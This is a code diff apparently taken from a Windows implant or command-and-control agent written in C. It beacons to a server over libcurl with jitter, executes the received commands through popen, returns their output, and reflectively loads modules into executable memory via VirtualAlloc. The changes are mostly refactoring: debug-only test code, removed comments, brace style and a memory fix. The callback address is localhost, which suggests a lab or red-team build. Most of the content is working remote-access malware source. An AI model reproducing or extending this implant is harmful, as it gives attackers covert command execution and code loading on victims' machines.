@@ -1,14 +1,10 @@
 // cl.exe /LD /MD main.c moduleloader.c /Fo.\obj\ /O2 /Ot /GL
 
-#include <stdio.h>
-#include <stdlib.h>
+#include "common.h"
 #include <string.h>
 #include <Windows.h>
 
 #include "commandlist.h"
-#include "common.h"
-#include "messagebox.h"
-#include "screenshot.h"
 #include "base64.h"
 
 #define CURL_STATICLIB
@@ -33,12 +29,6 @@ void command_loop(void);
 char *execute_command(const char *cmd);
 
 __declspec(dllexport) void MainExport(void);
-
-// This is for libcurl response data
-struct MemoryStruct {
-    char *memory;
-    size_t size;
-};
 
 // Global used to send data back to the server
 char* STORED_RESPONSE = NULL;
@@ -67,12 +57,10 @@ char* CMD_load(char* args)
 
     printf("Module: %p", module);
     printf("Module length: %zu\n", module_len);
-    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if( !lpBuffer )
 		BREAK_WITH_ERROR( "Failed to allocate space" );
 
-    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
     memcpy(lpBuffer, module, module_len);
     printf("memcpy\n");
     fflush(stdout);
@@ -109,36 +97,6 @@ char* CMD_install(char* args)
     return NULL;
 }
 
-// // Callback function to handle incoming data
-// size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
-// {
-//     // Null-terminate the response just in case
-//     char* data = ptr;
-//     data[(size*nmemb)-1] = '\0';
-//     printf("Received data: %s\n", (char *)ptr);
-    
-//     // Find the first space character to separate command and arguments
-//     char *space_pos = strchr(data, ' ');
-
-//     // Replace space with null byte to separate command and arguments
-//     if (space_pos != NULL)
-//     {
-//         *space_pos = '\0';
-//     }
-//     // Calculate pointers for command and arguments
-//     char *command = data;
-//     char *arguments = space_pos + 1;
-
-//     CommandNode* commandnode = findCommandNode(commandList, command);
-
-//     if (commandnode != NULL)
-//     {
-//         STORED_RESPONSE = commandnode->function(arguments);
-//     }
-
-//     return size * nmemb;
-// }
-
 // Callback function to handle incoming data
 void check_response(char* data)
 {   
@@ -162,6 +120,9 @@ void check_response(char* data)
     }
 }
 
+#ifdef DEBUG
+#include "messagebox.h"
+#include "screenshot.h"
 void ReflectiveTest(void)
 {
     LPVOID lpBuffer = NULL;
@@ -187,10 +148,13 @@ void ReflectiveTest(void)
     STORED_RESPONSE = tester->function("some args");
     printf("Done with reflective test.\n");
 }
+#endif
 
 int main(void)
 {
+    #ifdef DEBUG
     ReflectiveTest();
+    #endif
     // Initialize curl
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
@@ -222,13 +186,15 @@ void jitter_connect()
 }
 
 // Callback function to write received data to a dynamically growing buffer
-size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
+{
     size_t realsize = size * nmemb;
     struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
     
     // Reallocate memory to fit the new data
     char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
-    if (ptr_realloc == NULL) {
+    if (ptr_realloc == NULL)
+    {
         fprintf(stderr, "Memory allocation failed\n");
         return 0;
     }
@@ -247,8 +213,9 @@ void command_loop(void)
     CURLcode res;
     struct MemoryStruct chunk;
     // Initialize memory structure
-    chunk.memory = malloc(1);  // Start with a small initial size
-    if (chunk.memory == NULL) {
+    chunk.memory = malloc(1);
+    if (chunk.memory == NULL)
+    {
         fprintf(stderr, "Memory allocation failed\n");
         return;
     }
@@ -257,7 +224,8 @@ void command_loop(void)
     char* tmp = NULL;
 
     curl = curl_easy_init();
-    if (curl) {
+    if (curl)
+    {
         curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");
 
         // If STORED_RESPONSE is not NULL, we have data to send to the server
@@ -300,12 +268,14 @@ void command_loop(void)
 
         // Cleanup
         if (tmp) {free(tmp);}
+        free(chunk.memory); // Always allocated
         curl_easy_cleanup(curl);
     }
 }
 
 // Execute a command and capture its output. Cross-compilable for both Unix and Windows
-char *execute_command(const char *cmd) {
+char *execute_command(const char *cmd)
+{
     #ifdef _WIN32
     #define popen _popen
     #define pclose _pclose
@@ -318,7 +288,8 @@ char *execute_command(const char *cmd) {
 
     // Open the command for reading
     fp = popen(cmd, "r");
-    if (fp == NULL) {
+    if (fp == NULL)
+    {
         fprintf(stderr, "Failed to run command\n");
         return NULL;
     }
@@ -328,7 +299,8 @@ char *execute_command(const char *cmd) {
     {
         size_t line_length = strlen(line);
         result = realloc(result, total_size + line_length + 1);
-        if (result == NULL) {
+        if (result == NULL)
+        {
             fprintf(stderr, "Memory allocation failed\n");
             pclose(fp);
             return NULL;
